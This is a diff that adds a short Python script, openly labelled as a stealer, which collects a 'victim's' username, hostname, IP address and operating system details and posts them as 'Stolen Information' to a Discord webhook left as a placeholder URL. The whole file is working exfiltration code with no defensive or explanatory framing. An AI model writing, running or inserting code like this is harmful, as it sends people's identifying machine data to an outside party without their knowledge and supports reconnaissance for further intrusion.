@@ -1,0 +1,37 @@
+import requests
+import os
+import getpass
+import platform
+import socket
+
+# Function to get the victim's information
+def get_victim_info():
+    username = getpass.getuser()
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    os_info = platform.platform()
+
+    return username, hostname, ip_address, os_info
+
+# Function to send the stolen information to the Discord webhook
+def send_to_webhook(webhook_url, data):
+    requests.post(webhook_url, json=data)
+
+# Main function
+def main():
+    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+
+    # Get victim's information
+    username, hostname, ip_address, os_info = get_victim_info()
+
+    # Prepare the data to send
+    data = {
+        "content": f"**Stolen Information:**\nUsername: {username}\nHostname: {hostname}\nIP Address: {ip_address}\nOS Info: {os_info}"
+    }
+
+    # Send the data to the Discord webhook
+    send_to_webhook(webhook_url, data)
+
+# Execute the main function
+if __name__ == "__main__":
+    main()
